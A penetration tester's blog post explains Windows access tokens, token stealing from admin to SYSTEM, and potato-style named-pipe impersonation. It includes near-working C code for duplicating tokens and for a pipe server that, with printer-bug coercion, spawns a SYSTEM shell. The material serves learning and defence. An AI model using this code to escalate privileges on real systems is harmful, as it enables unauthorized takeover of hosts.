---
title: "Windows Access Tokens: Getting SYSTEM and demystifying Potato Exploits"
date: 2022-11-25T15:50:49+02:00
draft: false
---

If you are a penetration tester, you probably dealt with and abused windows access tokens before, e.g. to get `SYSTEM` privileges, using [some kind of potato](https://github.com/ohpe/juicy-potato), from an account with the `SeImpersonate` privilege set, when using meterpreter's `incognito` module or when using Cobalt Strike's `make_token` or `revert2self`. In the MITRE ATT&CK framework we can find [T1134: Access Token Manipulation](https://attack.mitre.org/techniques/T1134/) as a technique, used by many different threat actors.

Although often using tokens and knowing that there are primary and impersonation access tokens, I did not know much about how tokens *actually* work. I decided to dig a bit deeper, and learned about various Windows-API calls for access tokens, getting `SYSTEM` by stealing tokens and how those potatos really work. 

To be able to play around with tokens in a hands-on manner, a few weeks ago, I created a little tool (with a slightly megalomanic name) that can juggle around windows access tokens, which I am gonna use to visualize the techniques below. The tool can be found at https://github.com/eversinc33/godmode. 

Windows access tokens are a great subject to learn as a pentester to get involved with windows API programming (aside from the usual process injection calls). At the end of this small post you will hopefully understand the basics of windows access tokens and gain some insight on the inner workings of windows when abusing them.

I encourage you to implement some of this yourself, if you are interested. Don't use my tool for exploitation, it is just for exploration. If you just want to visualize tokens and play with them, without implementing anything, [TokenUniverse](https://github.com/diversenok/TokenUniverse) is a great tool to use. If you want to exploit this, use the tools you have already been using, or the ones I am referencing at the end of the post.

### So what are Windows access tokens?

To cite [MSDN](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens):

*An access token is an object that describes the security context of a process or thread. 
The information in a token includes the identity and privileges of the user account associated with the process or thread. 
When a user logs on [...] the system produces an access token. 
Every process executed on behalf of this user has a copy of this access token.*

Basically, access tokens are tokens that are created upon authentication and are then passed along to processes and threads. This makes it possible for the operating system to check whether a process or thread has the rights to access a certain resource. 

There are some additional attributes in a token, e.g. information about ACLs or restricted SIDs, but the above will be enough to understand the techniques explained here. Plus, I am far from being an expert on the topic, so I won't dig too deep.

### Primary vs. Impersonation Tokens

When you log on, a primary token is created by the Windows kernel and assigned to your processes. These can be seen as the "standard" kind of tokens. If you want to create a new process under a user's context, a copy of the primary token needs to be passed along to the new process.

This primary token can be viewed in process hacker:

![](/token.png)

If however a thread of a process needs to impersonate a different user (e.g. a server accessing resources for a client), an impersonation token can be set for this thread. This will allow the thread to access resources that the user and the privileges that are described in that impersonation token can access. This is the reason why service accounts often have the `SeImpersonate` privilege set, while normal users usually should not. Imagine a web server service account, that has to access an MSSQL server on behalf of a user that connects to the service - thats where impersonation comes into play.

An existing token (primary or impersonation) can be duplicated into either a primary or and impersonation token with the Win32 API function [`DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex):

![](/msdn.png)

By specifying the type in the `TokenType` parameter we can effectively freely convert between both types.

The first (ab)use case I want to cover is to escalate from local admin to `SYSTEM` by stealing access tokens.

### Stealing SYSTEM access tokens

A privileged account can copy access tokens from any existing process. This stolen token can then be either applied to an existing process or be used to spawn a new process, e.g. by using [`CreateProcessWithToken`](). This is all we need to do to get a `SYSTEM` shell.

In my tool, this is implemented with the `token.cmd` command.

First, all token handles are listed (which is done under the hood by using `NtQuerySystemInformation` to query all handles and checking if they are token handles). See [here for the code](https://github.com/eversinc33/godmode/blob/main/token.h#L304), as it is a bit too much to show here.

![](/tl.png)

When the user selects a token, a series of api calls copies the token from the selected process:

```c
/* Error handling is ommited in all code snippets for the sake of brevity*/

// open handle to process
HANDLE process = OpenProcess(PROCESS_DUP_HANDLE, FALSE, processId);

// duplicate the handle, where handleInfo.HandleValue is the token handle
HANDLE dupHandle;
DuplicateHandle(process, (HANDLE)handleInfo.HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS)

// duplicate the token, need to specify either TokenImpersonation or TokenPrimary as the fifth argument
// the type can be enumerated with GetTokenInformation,
// see: https://github.com/eversinc33/godmode/blob/main/token.h#L250
DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &pNewToken)
```
Finally, a new `cmd` process is spawned with this token as its primary token, using the `CreateProcessWithTokenW` API. Note that this part requires an enabled `SeImpersonatePrivilege`:

```c
STARTUPINFO si;
PROCESS_INFORMATION pi;
CreateProcessWithTokenW(pNewToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\system32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)
```

This results in a shell with the same security context as the process of which we duplicated the token:

![](/list.png)

So far so good, but what if we do not have a privileged account?

### Token Impersonation and Potato Exploits

Remember when I talked about impersonation tokens earlier? A process can impersonate another processes token, when the `SeImpersonatePrivilege` is enabled. You know what happens next if you see that privilege enabled on a compromised account: whip out a potato and get `SYSTEM`. But what is actually happening there?

Turns out that a named pipe server can impersonate any client that connects to its named pipe, when `SeImpersonatePrivilege` is enabled. This is what the windows api [`ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient) is for. Basically, all the potato exploits rely upon tricking a `SYSTEM` process into connecting to a named pipe controlled by the compromised account to then impersonate the connection. What differs mostly, is the way that authentication is triggered. For an awesome overview, check out [this great blog post](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) by Jorge Lajara.

The implementation of impersonation of a named pipe itself is simple. As above, error handling is removed here for brevity:

```c
SECURITY_ATTRIBUTES sa;
STARTUPINFOW si;
PROCESS_INFORMATION pi;
char buffer[256] = { 0 };
DWORD dwRead = 0;
DWORD bytesToRead = 1;
LPWSTR pipeName = L"\\\\.\\pipe\\spoolss"; // this pipe needs to be renamed, depending on the coercion method used

// setup named pipe
InitializeSecurityDescriptor(&sa, SECURITY_DESCRIPTOR_REVISION)
ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL)
HANDLE hPipe = CreateNamedPipeW(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 256 * sizeof(char), 256 * sizeof(char), NMPWAIT_USE_DEFAULT_WAIT, &sa);

// wait for the connection
if (ConnectNamedPipe(hPipe, NULL)) {
    printf("[*] Got connection!\n");

    // read from pipe and impersonate client
    PeekNamedPipe(hPipe, &buffer, (256-1) * sizeof(char), &dwRead, &bytesToRead, NULL)
    ImpersonateNamedPipeClient(hPipe)

    // open the current threads token
    HANDLE hToken;
    if (OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hToken)) {
        // duplicate token and save a reference in pNewToken
        HANDLE pNewToken;
        DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &pNewToken)

        // Revert to self to re-gain SeImpersonate priv
        RevertToSelf();
        
        // start a process with our clients token
        STARTUPINFO si2;
        PROCESS_INFORMATION pi2;
        if (!CreateProcessWithTokenW(pNewToken, 0, L"C:\\Windows\\system32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si2, &pi2)) {
            printf("[!] ERROR: Could not create process with token: %d\n", GetLastError());
        }
    }
}
```

Since for this example I will be using the printer bug (as implemented by https://github.com/leechristensen/SpoolSample) to coerce `SYSTEM` to authenticate to my pipe, I had to specify the pipe name `\\\\.\\pipe\\spoolss`, since this is what `MS-RPRN`, Microsofts [Print System Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1?redirectedfrom=MSDN), connects to.

Now we have all we need to get a `SYSTEM` shell using token impersonation: 

![](/spools.png)

We effectively have created an (immature) malleable potato, where the trigger can be freely chosen.

Of course I am not the first one with that came up with this. I know of at least two repositories that have this implemented in a much more weaponized way, namely [@micahvandeusen](https://twitter.com/micahvandeusen) with https://github.com/micahvandeusen/GenericPotato and [@s3cur3th1ssh1t](https://twitter.com/ShitSecure) with https://github.com/S3cur3Th1sSh1t/MultiPotato. Use these tools for active exploitation instead.

### What else?

There are other token manipulation techniques and other privileges that can be exploited to escalate privileges. A short overview on this can be viewed over at [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens) and many infos can be found all over the internet. The point here is not to list a comprehensive list of token manipulation techniques, but to mainly document my learnings here for myself and hopefully encourage you to try this stuff out yourself.

Happy Hacking!

##### References & Credits

* https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens
* https://0x00-0x00.github.io/research/2018/10/17/Windows-API-and-Impersonation-Part1.html
* https://github.com/diversenok/TokenUniverse
* https://jlajara.gitlab.io/Potatoes_Windows_Privesc
* https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
* https://github.com/sensepost/impersonate
* https://github.com/S3cur3Th1sSh1t/MultiPotato
* https://github.com/micahvandeusen/GenericPotato
